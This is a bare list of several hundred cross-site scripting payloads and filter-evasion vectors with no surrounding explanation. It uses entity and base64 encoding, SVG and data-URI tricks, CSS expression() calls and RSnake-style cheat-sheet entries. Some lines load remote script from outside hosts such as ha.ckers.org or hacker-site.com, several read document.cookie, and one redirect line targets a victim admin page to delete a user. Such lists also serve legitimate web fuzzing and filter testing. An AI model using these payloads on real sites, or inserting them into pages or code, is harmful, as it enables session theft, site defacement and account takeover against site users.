<svg><style>{font-family&colon;'<iframe/onload=confirm(1)>'
<input/onmouseover="javaSCRIPT&colon;confirm&lpar;1&rpar;"
<sVg><scRipt >alert&lpar;1&rpar; {Opera}
<img/src=`` onerror=this.onerror=confirm(1) 
<form><isindex formaction="javascript&colon;confirm(1)"
<img src=``&NewLine; onerror=alert(1)&NewLine;
<script/&Tab; src='https://dl.dropbox.com/u/13018058/js.js' /&Tab;></script>
<ScRipT 5-0*3+9/3=>prompt(1)</ScRipT giveanswerhere=?
<iframe/src="data:text/html;&Tab;base64&Tab;,PGJvZHkgb25sb2FkPWFsZXJ0KDEpPg==">
<script /**/>/**/alert(1)/**/</script /**/
&#34;&#62;<h1/onmouseover='\u0061lert(1)'>
<iframe/src="data:text/html,<svg &#111;&#110;load=alert(1)>">
<meta content="&NewLine; 1 &NewLine;; JAVASCRIPT&colon; alert(1)" http-equiv="refresh"/>
<svg><script xlink:href=data&colon;,window.open('https://www.google.com/')></script
<svg><script x:href='https://dl.dropbox.com/u/13018058/js.js' {Opera}
<meta http-equiv="refresh" content="0;url=javascript:confirm(1)">
<iframe src=javascript&colon;alert&lpar;document&period;location&rpar;>
<form><a href="javascript:\u0061lert&#x28;1&#x29;">X
</script><img/*/src="worksinchrome&colon;prompt&#x28;1&#x29;"/*/onerror='eval(src)'>
<img/&#09;&#10;&#11; src=`~` onerror=prompt(1)>
<form><iframe &#09;&#10;&#11; src="javascript&#58;alert(1)"&#11;&#10;&#09;;>
<a href="data:application/x-x509-user-cert;&NewLine;base64&NewLine;,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="&#09;&#10;&#11;>X</a
http://www.google<script .com>alert(document.location)</script
<a&#32;href&#61;&#91;&#00;&#93;"&#00; onmouseover=prompt&#40;1&#41;&#47;&#47;">XYZ</a
<img/src=@&#32;&#13; onerror = prompt('&#49;')
<style/onload=prompt&#40;'&#88;&#83;&#83;'&#41;
<script ^__^>alert(String.fromCharCode(49))</script ^__^
</style &#32;><script &#32; :-(>/**/alert(document.location)/**/</script &#32; :-(
&#00;</form><input type&#61;"date" onfocus="alert(1)">
<form><textarea &#13; onkeyup='\u0061\u006C\u0065\u0072\u0074&#x28;1&#x29;'>
<script /***/>/***/confirm('\uFF41\uFF4C\uFF45\uFF52\uFF54\u1455\uFF11\u1450')/***/</script /***/
<iframe srcdoc='&lt;body onload=prompt&lpar;1&rpar;&gt;'>
<a href="javascript:void(0)" onmouseover=&NewLine;javascript:alert(1)&NewLine;>X</a>
<script ~~~>alert(0%0)</script ~~~>
<style/onload=&lt;!--&#09;&gt;&#10;alert&#10;&lpar;1&rpar;>
<///style///><span %2F onmousemove='alert&lpar;1&rpar;'>SPAN
<img/src='http://i.imgur.com/P8mL8.jpg' onmouseover=&Tab;prompt(1)
&#34;&#62;<svg><style>{-o-link-source&colon;'<body/onload=confirm(1)>'
&#13;<blink/&#13; onmouseover=pr&#x6F;mp&#116;(1)>OnMouseOver {Firefox & Opera}
<marquee onstart='javascript:alert&#x28;1&#x29;'>^__^
<div/style="width:expression(confirm(1))">X</div> {IE7}
<iframe// src=javaSCRIPT&colon;alert(1)
//<form/action=javascript&#x3A;alert&lpar;document&period;cookie&rpar;><input/type='submit'>//
/*iframe/src*/<iframe/src="<iframe/src=@"/onload=prompt(1) /*iframe/src*/>
//|\\ <script //|\\ src='https://dl.dropbox.com/u/13018058/js.js'> //|\\ </script //|\\
</font>/<svg><style>{src&#x3A;'<style/onload=this.onload=confirm(1)>'</font>/</style>
<a/href="javascript:&#13; javascript:prompt(1)"><input type="X">
</plaintext\></|\><plaintext/onmouseover=prompt(1)
</svg>''<svg><script 'AQuickBrownFoxJumpsOverTheLazyDog'>alert&#x28;1&#x29; {Opera}
<a href="javascript&colon;\u0061&#x6C;&#101%72t&lpar;1&rpar;"><button>
<div onmouseover='alert&lpar;1&rpar;'>DIV</div>
<iframe style="position:absolute;top:0;left:0;width:100%;height:100%" onmouseover="prompt(1)">
<a href="jAvAsCrIpT&colon;alert&lpar;1&rpar;">X</a>
<embed src="http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf">
<object data="http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf">
<var onmouseover="prompt(1)">On Mouse Over</var>
<a href=javascript&colon;alert&lpar;document&period;cookie&rpar;>Click Here</a>
<img src="/" =_=" title="onerror='prompt(1)'">
<%<!--'%><script>alert(1);</script -->
<script src="data:text/javascript,alert(1)"></script>
<iframe/src \/\/onload = prompt(1)
<iframe/onreadystatechange=alert(1)
<svg/onload=alert(1)
<input value=<><iframe/src=javascript:confirm(1)
<input type="text" value=`` <div/onmouseover='alert(1)'>X</div>
<iframe src=j&Tab;a&Tab;v&Tab;a&Tab;s&Tab;c&Tab;r&Tab;i&Tab;p&Tab;t&Tab;:a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;%28&Tab;1&Tab;%29></iframe>
<img src=`xx:xx`onerror=alert(1)>
<object type="text/x-scriptlet" data="http://jsfiddle.net/XLE63/ "></object>
<meta http-equiv="refresh" content="0;javascript&colon;alert(1)"/>
<math><a xlink:href="//jsfiddle.net/t846h/">click
<embed code="http://businessinfo.co.uk/labs/xss/xss.swf" allowscriptaccess=always>
<svg contentScriptType=text/vbs><script>MsgBox+1
<a href="data:text/html;base64_,<svg/onload=\u0061&#x6C;&#101%72t(1)>">X</a
<iframe/onreadystatechange=\u0061\u006C\u0065\u0072\u0074('\u0061') worksinIE>
<script>~'\u0061' ; \u0074\u0068\u0072\u006F\u0077 ~ \u0074\u0068\u0069\u0073. \u0061\u006C\u0065\u0072\u0074(~'\u0061')</script U+
<script/src="data&colon;text%2Fj\u0061v\u0061script,\u0061lert('\u0061')"></script a=\u0061 & /=%2F
<script/src=data&colon;text/j\u0061v\u0061&#115&#99&#114&#105&#112&#116,\u0061%6C%65%72%74(/XSS/)></script
<object data=javascript&colon;\u0061&#x6C;&#101%72t(1)>
<script>+-+-1-+-+alert(1)</script>
<body/onload=&lt;!--&gt;&#10alert(1)>
<script itworksinallbrowsers>/*<script* */alert(1)</script
<img src ?itworksonchrome?\/onerror = alert(1)
<svg><script>//&NewLine;confirm(1);</script </svg>
<svg><script onlypossibleinopera:-)> alert(1)
<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaa aaaaaaaaaa href=j&#97v&#97script&#x3A;&#97lert(1)>ClickMe
<script x> alert(1) </script 1=2
<div/onmouseover='alert(1)'> style="x:">
<--`<img/src=` onerror=alert(1)> --!>
<script/src=&#100&#97&#116&#97:text/&#x6a&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x000070&#x074,&#x0061;&#x06c;&#x0065;&#x00000072;&#x00074;(1)></script>
<div style="position:absolute;top:0;left:0;width:100%;height:100%" onmouseover="prompt(1)" onclick="alert(1)">x</button>
"><img src=x onerror=window.open('https://www.google.com/');>
<form><button formaction=javascript&colon;alert(1)>CLICKME
<math><a xlink:href="//jsfiddle.net/t846h/">click
<object data=data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+></object>
<iframe src="data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E"></iframe>
<a href="data:text/html;blabla,&#60&#115&#99&#114&#105&#112&#116&#32&#115&#114&#99&#61&#34&#104&#116&#116&#112&#58&#47&#47&#115&#116&#101&#114&#110&#101&#102&#97&#109&#105&#108&#121&#46&#110&#101&#116&#47&#102&#111&#111&#46&#106&#115&#34&#62&#60&#47&#115&#99&#114&#105&#112&#116&#62&#8203">Click Me</a>
'';!--"<XSS>=&{()}
'>//\\,<'>">">"*"
'); alert('XSS
<script>alert(1);</script>
<script>alert('XSS');</script>
<IMG SRC="javascript:alert('XSS');">
<IMG SRC=javascript:alert('XSS')>
<IMG SRC=javascript:alert('XSS')>
<IMG SRC=javascript:alert(&quot;XSS&quot;)>

<scr<script>ipt>alert('XSS');</scr</script>ipt>
<script>alert(String.fromCharCode(88,83,83))</script> 
<img src=foo.png onerror=alert(/xssed/) />
<style>@im\port'\ja\vasc\ript:alert(\"XSS\")';</style>
<? echo('<scr)'; echo('ipt>alert(\"XSS\")</script>'); ?>
<marquee><script>alert('XSS')</script></marquee>
<IMG SRC=\"jav&#x09;ascript:alert('XSS');\">
<IMG SRC=\"jav&#x0A;ascript:alert('XSS');\">
<IMG SRC=\"jav&#x0D;ascript:alert('XSS');\">
<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>
"><script>alert(0)</script>
<script src=http://yoursite.com/your_files.js></script>
</title><script>alert(/xss/)</script>
</textarea><script>alert(/xss/)</script>
<IMG LOWSRC=\"javascript:alert('XSS')\">
<IMG DYNSRC=\"javascript:alert('XSS')\">
<font style='color:expression(alert(document.cookie))'>
<img src="javascript:alert('XSS')">
<script language="JavaScript">alert('XSS')</script>
<body onunload="javascript:alert('XSS');">
<body onLoad="alert('XSS');"
[color=red' onmouseover="alert('xss')"]mouse over[/color]
"/></a></><img src=1.gif onerror=alert(1)>
window.alert("Bonjour !");
<div style="x:expression((window.r==1)?'':eval('r=1;
alert(String.fromCharCode(88,83,83));'))">
<iframe<?php echo chr(11)?> onload=alert('XSS')></iframe>
"><script alert(String.fromCharCode(88,83,83))</script>
'>><marquee><h1>XSS</h1></marquee>
'">><script>alert('XSS')</script>
'">><marquee><h1>XSS</h1></marquee>
<META HTTP-EQUIV=\"refresh\" CONTENT=\"0;url=javascript:alert('XSS');\">
<META HTTP-EQUIV=\"refresh\" CONTENT=\"0; URL=http://;URL=javascript:alert('XSS');\">
<script>var var = 1; alert(var)</script>
<STYLE type="text/css">BODY{background:url("javascript:alert('XSS')")}</STYLE>
<?='<SCRIPT>alert("XSS")</SCRIPT>'?>
<IMG SRC='vbscript:msgbox(\"XSS\")'>
" onfocus=alert(document.domain) "> <"
<FRAMESET><FRAME SRC=\"javascript:alert('XSS');\"></FRAMESET>
<STYLE>li {list-style-image: url(\"javascript:alert('XSS')\");}</STYLE><UL><LI>XSS
perl -e 'print \"<SCR\0IPT>alert(\"XSS\")</SCR\0IPT>\";' > out
perl -e 'print \"<IMG SRC=java\0script:alert(\"XSS\")>\";' > out
<br size=\"&{alert('XSS')}\">
<scrscriptipt>alert(1)</scrscriptipt>
</br style=a:expression(alert())>
</script><script>alert(1)</script>
"><BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")>
[color=red width=expression(alert(123))][color]
<BASE HREF="javascript:alert('XSS');//">
Execute(MsgBox(chr(88)&chr(83)&chr(83)))<
"></iframe><script>alert(123)</script>
<body onLoad="while(true) alert('XSS');">
'"></title><script>alert(1111)</script>
</textarea>'"><script>alert(document.cookie)</script>
'""><script language="JavaScript"> alert('X \nS \nS');</script>
</script></script><<<<script><>>>><<<script>alert(123)</script>
<html><noalert><noscript>(123)</noscript><script>(123)</script>
<INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');">
'></select><script>alert(123)</script>
'>"><script src = 'http://www.site.com/XSS.js'></script>
}</style><script>a=eval;b=alert;a(b(/XSS/.source));</script>
<SCRIPT>document.write("XSS");</SCRIPT>
a="get";b="URL";c="javascript:";d="alert('xss');";eval(a+b+c+d);
='><script>alert("xss")</script>
<script+src=">"+src="http://yoursite.com/xss.js?69,69"></script>
<body background=javascript:'"><script>alert(navigator.userAgent)</script>></body>
">/XaDoS/><script>alert(document.cookie)</script><script src="http://www.site.com/XSS.js"></script>
">/KinG-InFeT.NeT/><script>alert(document.cookie)</script>
src="http://www.site.com/XSS.js"></script>
data:text/html;charset=utf-7;base64,Ij48L3RpdGxlPjxzY3JpcHQ+YWxlcnQoMTMzNyk8L3NjcmlwdD4=
!--" /><script>alert('xss');</script>
<script>alert("XSS by \nxss")</script><marquee><h1>XSS by xss</h1></marquee>
"><script>alert("XSS by \nxss")</script>><marquee><h1>XSS by xss</h1></marquee>
'"></title><script>alert("XSS by \nxss")</script>><marquee><h1>XSS by xss</h1></marquee>
<script>alert("XSS by \nxss")</script><marquee><h1>XSS by xss</h1></marquee>
<script>alert(1337)</script><marquee><h1>XSS by xss</h1></marquee>
"><script>alert(1337)</script>"><script>alert("XSS by \nxss</h1></marquee>
'"></title><script>alert(1337)</script>><marquee><h1>XSS by xss</h1></marquee>
<iframe src="javascript:alert('XSS by \nxss');"></iframe><marquee><h1>XSS by xss</h1></marquee>
'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT><img src="" alt='
"><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT><img src="" alt="
\'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT><img src="" alt=\'
http://www.simpatie.ro/index.php?page=friends&member=781339&javafunctionname=Pageclick&javapgno=2 javapgno=2 ??XSS??
http://www.simpatie.ro/index.php?page=top_movies&cat=13&p=2 p=2 ??XSS??
'); alert('xss'); var x='
\\'); alert(\'xss\');var x=\'
//--></SCRIPT><SCRIPT>alert(String.fromCharCode(88,83,83));
>"><ScRiPt%20%0a%0d>alert(561177485777)%3B</ScRiPt>
<img src="Mario Heiderich says that svg SHOULD not be executed trough image tags" onerror="javascript:document.write('\u003c\u0069\u0066\u0072\u0061\u006d\u0065\u0020\u0073\u0072\u0063\u003d\u0022\u0064\u0061\u0074\u0061\u003a\u0069\u006d\u0061\u0067\u0065\u002f\u0073\u0076\u0067\u002b\u0078\u006d\u006c\u003b\u0062\u0061\u0073\u0065\u0036\u0034\u002c\u0050\u0048\u004e\u0032\u005a\u0079\u0042\u0034\u0062\u0057\u0078\u0075\u0063\u007a\u0030\u0069\u0061\u0048\u0052\u0030\u0063\u0044\u006f\u0076\u004c\u0033\u0064\u0033\u0064\u0079\u0035\u0033\u004d\u0079\u0035\u0076\u0063\u006d\u0063\u0076\u004d\u006a\u0041\u0077\u004d\u0043\u0039\u007a\u0064\u006d\u0063\u0069\u0050\u0069\u0041\u0067\u0043\u0069\u0041\u0067\u0049\u0044\u0078\u0070\u0062\u0057\u0046\u006e\u005a\u0053\u0042\u0076\u0062\u006d\u0078\u0076\u0059\u0057\u0051\u0039\u0049\u006d\u0046\u0073\u005a\u0058\u004a\u0030\u004b\u0044\u0045\u0070\u0049\u006a\u0034\u0038\u004c\u0032\u006c\u0074\u0059\u0057\u0064\u006c\u0050\u0069\u0041\u0067\u0043\u0069\u0041\u0067\u0049\u0044\u0078\u007a\u0064\u006d\u0063\u0067\u0062\u0032\u0035\u0073\u0062\u0032\u0046\u006b\u0050\u0053\u004a\u0068\u0062\u0047\u0056\u0079\u0064\u0043\u0067\u0079\u004b\u0053\u0049\u002b\u0050\u0043\u0039\u007a\u0064\u006d\u0063\u002b\u0049\u0043\u0041\u004b\u0049\u0043\u0041\u0067\u0050\u0048\u004e\u006a\u0063\u006d\u006c\u0077\u0064\u0044\u0035\u0068\u0062\u0047\u0056\u0079\u0064\u0043\u0067\u007a\u004b\u0054\u0077\u0076\u0063\u0032\u004e\u0079\u0061\u0058\u0042\u0030\u0050\u0069\u0041\u0067\u0043\u0069\u0041\u0067\u0049\u0044\u0078\u006b\u005a\u0057\u005a\u007a\u0049\u0047\u0039\u0075\u0062\u0047\u0039\u0068\u005a\u0044\u0030\u0069\u0059\u0057\u0078\u006c\u0063\u006e\u0051\u006f\u004e\u0043\u006b\u0069\u0050\u006a\u0077\u0076\u005a\u0047\u0056\u006d\u0063\u007a\u0034\u0067\u0049\u0041\u006f\u0067\u0049\u0043\u0041\u0038\u005a\u0079\u0042\u0076\u0062\u006d\u0078\u0076\u0059\u0057\u0051\u0039\u0049\u006d\u0046\u0073\u005a\u0058\u004a\u0030\u004b\u0044\u0055\u0070\u0049\u006a\u0034\u0067\u0049\u0041\u006f\u0067\u0049\u0043\u0041\u0067\u0049\u0043\u0041\u0067\u0050\u0047\u004e\u0070\u0063\u006d\u004e\u0073\u005a\u0053\u0042\u0076\u0062\u006d\u0078\u0076\u0059\u0057\u0051\u0039\u0049\u006d\u0046\u0073\u005a\u0058\u004a\u0030\u004b\u0044\u0059\u0070\u0049\u0069\u0041\u0076\u0050\u0069\u0041\u0067\u0043\u0069\u0041\u0067\u0049\u0043\u0041\u0067\u0049\u0043\u0041\u0038\u0064\u0047\u0056\u0034\u0064\u0043\u0042\u0076\u0062\u006d\u0078\u0076\u0059\u0057\u0051\u0039\u0049\u006d\u0046\u0073\u005a\u0058\u004a\u0030\u004b\u0044\u0063\u0070\u0049\u006a\u0034\u0038\u004c\u0033\u0052\u006c\u0065\u0048\u0051\u002b\u0049\u0043\u0041\u004b\u0049\u0043\u0041\u0067\u0050\u0043\u0039\u006e\u0050\u0069\u0041\u0067\u0043\u006a\u0077\u0076\u0063\u0033\u005a\u006e\u0050\u0069\u0041\u0067\u0022\u003e\u003c\u002f\u0069\u0066\u0072\u0061\u006d\u0065\u003e');"></img>
</body>
</html>
<SCRIPT SRC=http://hacker-site.com/xss.js></SCRIPT>
<SCRIPT> alert(“XSS”); </SCRIPT>
<BODY ONLOAD=alert("XSS")>
<BODY BACKGROUND="javascript:alert('XSS')">
<IMG SRC="javascript:alert('XSS');">
<IMG DYNSRC="javascript:alert('XSS')">
<IMG LOWSRC="javascript:alert('XSS')">
<IFRAME SRC=”http://hacker-site.com/xss.html”>
<INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');">
<LINK REL="stylesheet" HREF="javascript:alert('XSS');">
<TABLE BACKGROUND="javascript:alert('XSS')">
<TD BACKGROUND="javascript:alert('XSS')">
<DIV STYLE="background-image: url(javascript:alert('XSS'))">
<DIV STYLE="width: expression(alert('XSS'));">
<OBJECT TYPE="text/x-scriptlet" DATA="http://hacker.com/xss.html">
<EMBED SRC="http://hacker.com/xss.swf" AllowScriptAccess="always">
&apos;;alert(String.fromCharCode(88,83,83))//\&apos;;alert(String.fromCharCode(88,83,83))//&quot;;alert(String.fromCharCode(88,83,83))//\&quot;;alert(String.fromCharCode(88,83,83))//--&gt;&lt;/SCRIPT&gt;&quot;&gt;&apos;&gt;&lt;SCRIPT&gt;alert(String.fromCharCode(88,83,83))&lt;/SCRIPT&gt;
&apos;&apos;;!--&quot;&lt;XSS&gt;=&amp;{()}
&lt;SCRIPT&gt;alert(&apos;XSS&apos;)&lt;/SCRIPT&gt;
&lt;SCRIPT SRC=http://ha.ckers.org/xss.js&gt;&lt;/SCRIPT&gt;
&lt;SCRIPT&gt;alert(String.fromCharCode(88,83,83))&lt;/SCRIPT&gt;
&lt;BASE HREF=&quot;javascript:alert(&apos;XSS&apos;);//&quot;&gt;
&lt;BGSOUND SRC=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;
&lt;BODY BACKGROUND=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;
&lt;BODY ONLOAD=alert(&apos;XSS&apos;)&gt;
&lt;DIV STYLE=&quot;background-image: url(javascript:alert(&apos;XSS&apos;))&quot;&gt;
&lt;DIV STYLE=&quot;background-image: url(&amp;#1;javascript:alert(&apos;XSS&apos;))&quot;&gt;
&lt;DIV STYLE=&quot;width: expression(alert(&apos;XSS&apos;));&quot;&gt;
&lt;FRAMESET&gt;&lt;FRAME SRC=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;&lt;/FRAMESET&gt;
&lt;IFRAME SRC=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;&lt;/IFRAME&gt;
&lt;INPUT TYPE=&quot;IMAGE&quot; SRC=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;
&lt;IMG SRC=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;
&lt;IMG SRC=javascript:alert(&apos;XSS&apos;)&gt;
&lt;IMG DYNSRC=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;
&lt;IMG LOWSRC=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;
&lt;IMG SRC=&quot;http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode&quot;&gt;
Redirect 302 /a.jpg http://victimsite.com/admin.asp&amp;deleteuser
exp/*&lt;XSS STYLE=&apos;no\xss:noxss(&quot;*//*&quot;);
&lt;STYLE&gt;li {list-style-image: url(&quot;javascript:alert(&#39;XSS&#39;)&quot;);}&lt;/STYLE&gt;&lt;UL&gt;&lt;LI&gt;XSS
&lt;IMG SRC=&apos;vbscript:msgbox(&quot;XSS&quot;)&apos;&gt;
&lt;LAYER SRC=&quot;http://ha.ckers.org/scriptlet.html&quot;&gt;&lt;/LAYER&gt;
&lt;IMG SRC=&quot;livescript:[code]&quot;&gt;
%BCscript%BEalert(%A2XSS%A2)%BC/script%BE
&lt;META HTTP-EQUIV=&quot;refresh&quot; CONTENT=&quot;0;url=javascript:alert(&apos;XSS&apos;);&quot;&gt;
&lt;META HTTP-EQUIV=&quot;refresh&quot; CONTENT=&quot;0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K&quot;&gt;
&lt;META HTTP-EQUIV=&quot;refresh&quot; CONTENT=&quot;0; URL=http://;URL=javascript:alert(&apos;XSS&apos;);&quot;&gt;
&lt;IMG SRC=&quot;mocha:[code]&quot;&gt;
&lt;OBJECT TYPE=&quot;text/x-scriptlet&quot; DATA=&quot;http://ha.ckers.org/scriptlet.html&quot;&gt;&lt;/OBJECT&gt;
&lt;OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389&gt;&lt;param name=url value=javascript:alert(&apos;XSS&apos;)&gt;&lt;/OBJECT&gt;
&lt;EMBED SRC=&quot;http://ha.ckers.org/xss.swf&quot; AllowScriptAccess=&quot;always&quot;&gt;&lt;/EMBED&gt;
a=&quot;get&quot;;&amp;#10;b=&quot;URL(&quot;&quot;;&amp;#10;c=&quot;javascript:&quot;;&amp;#10;d=&quot;alert(&apos;XSS&apos;);&quot;)&quot;;&#10;eval(a+b+c+d);
&lt;STYLE TYPE=&quot;text/javascript&quot;&gt;alert(&apos;XSS&apos;);&lt;/STYLE&gt;
&lt;IMG STYLE=&quot;xss:expr/*XSS*/ession(alert(&apos;XSS&apos;))&quot;&gt;
&lt;XSS STYLE=&quot;xss:expression(alert(&apos;XSS&apos;))&quot;&gt;
&lt;STYLE&gt;.XSS{background-image:url(&quot;javascript:alert(&apos;XSS&apos;)&quot;);}&lt;/STYLE&gt;&lt;A CLASS=XSS&gt;&lt;/A&gt;
&lt;STYLE type=&quot;text/css&quot;&gt;BODY{background:url(&quot;javascript:alert(&apos;XSS&apos;)&quot;)}&lt;/STYLE&gt;
&lt;LINK REL=&quot;stylesheet&quot; HREF=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;
&lt;LINK REL=&quot;stylesheet&quot; HREF=&quot;http://ha.ckers.org/xss.css&quot;&gt;
&lt;STYLE&gt;@import&apos;http://ha.ckers.org/xss.css&apos;;&lt;/STYLE&gt;
&lt;META HTTP-EQUIV=&quot;Link&quot; Content=&quot;&lt;http://ha.ckers.org/xss.css&gt;; REL=stylesheet&quot;&gt;
&lt;STYLE&gt;BODY{-moz-binding:url(&quot;http://ha.ckers.org/xssmoz.xml#xss&quot;)}&lt;/STYLE&gt;
&lt;TABLE BACKGROUND=&quot;javascript:alert(&apos;XSS&apos;)&quot;&gt;&lt;/TABLE&gt;
&lt;TABLE&gt;&lt;TD BACKGROUND=&quot;javascript:alert(&apos;XSS&apos;)&quot;&gt;&lt;/TD&gt;&lt;/TABLE&gt;
&lt;HTML xmlns:xss&gt;
&lt;XML ID=I&gt;&lt;X&gt;&lt;C&gt;&lt;![CDATA[&lt;IMG SRC=&quot;javas]]&gt;&lt;![CDATA[cript:alert(&apos;XSS&apos;);&quot;&gt;]]&gt;
&lt;XML ID=&quot;xss&quot;&gt;&lt;I&gt;&lt;B&gt;&lt;IMG SRC=&quot;javas&lt;!-- --&gt;cript:alert(&apos;XSS&apos;)&quot;&gt;&lt;/B&gt;&lt;/I&gt;&lt;/XML&gt;
&lt;XML SRC=&quot;http://ha.ckers.org/xsstest.xml&quot; ID=I&gt;&lt;/XML&gt;
&lt;HTML&gt;&lt;BODY&gt;
&lt;!--[if gte IE 4]&gt;               
&lt;META HTTP-EQUIV=&quot;Set-Cookie&quot; Content=&quot;USERID=&lt;SCRIPT&gt;alert(&apos;XSS&apos;)&lt;/SCRIPT&gt;&quot;&gt;
&lt;XSS STYLE=&quot;behavior: url(http://ha.ckers.org/xss.htc);&quot;&gt;
&lt;SCRIPT SRC=&quot;http://ha.ckers.org/xss.jpg&quot;&gt;&lt;/SCRIPT&gt;
&lt;!--#exec cmd=&quot;/bin/echo &apos;&lt;SCRIPT SRC&apos;&quot;--&gt;&lt;!--#exec cmd=&quot;/bin/echo &apos;=http://ha.ckers.org/xss.js&gt;&lt;/SCRIPT&gt;&apos;&quot;--&gt;
&lt;? echo(&apos;&lt;SCR)&apos;;
&lt;BR SIZE=&quot;&amp;{alert(&apos;XSS&apos;)}&quot;&gt;
&lt;IMG SRC=JaVaScRiPt:alert(&apos;XSS&apos;)&gt;
&lt;IMG SRC=javascript:alert(&amp;quot;XSS&amp;quot;)&gt;
&lt;IMG SRC=`javascript:alert(&quot;RSnake says, &apos;XSS&apos;&quot;)`&gt;
&lt;IMG SRC=javascript:alert(String.fromCharCode(88,83,83))&gt;
&lt;IMG SRC=&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#39;&amp;#88;&amp;#83;&amp;#83;&amp;#39;&amp;#41;&gt;
&lt;IMG SRC=&amp;#0000106&amp;#0000097&amp;#0000118&amp;#0000097&amp;#0000115&amp;#0000099&amp;#0000114&amp;#0000105&amp;#0000112&amp;#0000116&amp;#0000058&amp;#0000097&amp;#0000108&amp;#0000101&amp;#0000114&amp;#0000116&amp;#0000040&amp;#0000039&amp;#0000088&amp;#0000083&amp;#0000083&amp;#0000039&amp;#0000041&gt;
&lt;DIV STYLE=&quot;background-image:\0075\0072\006C\0028&apos;\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029&apos;\0029&quot;&gt;
&lt;IMG SRC=&amp;#x6A&amp;#x61&amp;#x76&amp;#x61&amp;#x73&amp;#x63&amp;#x72&amp;#x69&amp;#x70&amp;#x74&amp;#x3A&amp;#x61&amp;#x6C&amp;#x65&amp;#x72&amp;#x74&amp;#x28&amp;#x27&amp;#x58&amp;#x53&amp;#x53&amp;#x27&amp;#x29&gt;
&lt;HEAD&gt;&lt;META HTTP-EQUIV=&quot;CONTENT-TYPE&quot; CONTENT=&quot;text/html; charset=UTF-7&quot;&gt; &lt;/HEAD&gt;+ADw-SCRIPT+AD4-alert(&apos;XSS&apos;);+ADw-/SCRIPT+AD4-
\&quot;;alert(&apos;XSS&apos;);//
&lt;/TITLE&gt;&lt;SCRIPT&gt;alert("XSS");&lt;/SCRIPT&gt;
&lt;STYLE&gt;@im\port&apos;\ja\vasc\ript:alert(&quot;XSS&quot;)&apos;;&lt;/STYLE&gt;
&lt;IMG SRC=&quot;jav&#x09;ascript:alert(&apos;XSS&apos;);&quot;&gt;
&lt;IMG SRC=&quot;jav&amp;#x09;ascript:alert(&apos;XSS&apos;);&quot;&gt;
&lt;IMG SRC=&quot;jav&amp;#x0A;ascript:alert(&apos;XSS&apos;);&quot;&gt;
&lt;IMG SRC=&quot;jav&amp;#x0D;ascript:alert(&apos;XSS&apos;);&quot;&gt;
&lt;IMG&#x0D;SRC&#x0D;=&#x0D;&quot;&#x0D;j&#x0D;a&#x0D;v&#x0D;a&#x0D;s&#x0D;c&#x0D;r&#x0D;i&#x0D;p&#x0D;t&#x0D;:&#x0D;a&#x0D;l&#x0D;e&#x0D;r&#x0D;t&#x0D;(&#x0D;&apos;&#x0D;X&#x0D;S&#x0D;S&#x0D;&apos;&#x0D;)&#x0D;&quot;&#x0D;&gt;&#x0D;
perl -e &apos;print &quot;&lt;IMG SRC=java\0script:alert(&quot;XSS&quot;)>&quot;;&apos;&gt; out
perl -e &apos;print &quot;&amp;&lt;SCR\0IPT&gt;alert(&quot;XSS&quot;)&lt;/SCR\0IPT&gt;&quot;;&apos; &gt; out
&lt;IMG SRC=&quot; &amp;#14;  javascript:alert(&apos;XSS&apos;);&quot;&gt;
&lt;SCRIPT/XSS SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;
&lt;BODY onload!#$%&amp;()*~+-_.,:;?@[/|\]^`=alert(&quot;XSS&quot;)&gt;
&lt;SCRIPT SRC=http://ha.ckers.org/xss.js
&lt;SCRIPT SRC=//ha.ckers.org/.j&gt;
&lt;IMG SRC=&quot;javascript:alert(&apos;XSS&apos;)&quot;
&lt;IFRAME SRC=http://ha.ckers.org/scriptlet.html &lt;
&lt;&lt;SCRIPT&gt;alert(&quot;XSS&quot;);//&lt;&lt;/SCRIPT&gt;
&lt;IMG &quot;&quot;&quot;&gt;&lt;SCRIPT&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;&quot;&gt;
&lt;SCRIPT&gt;a=/XSS/
&lt;SCRIPT a=&quot;&gt;&quot; SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;
&lt;SCRIPT =&quot;blah&quot; SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;
&lt;SCRIPT a=&quot;blah&quot; &apos;&apos; SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;
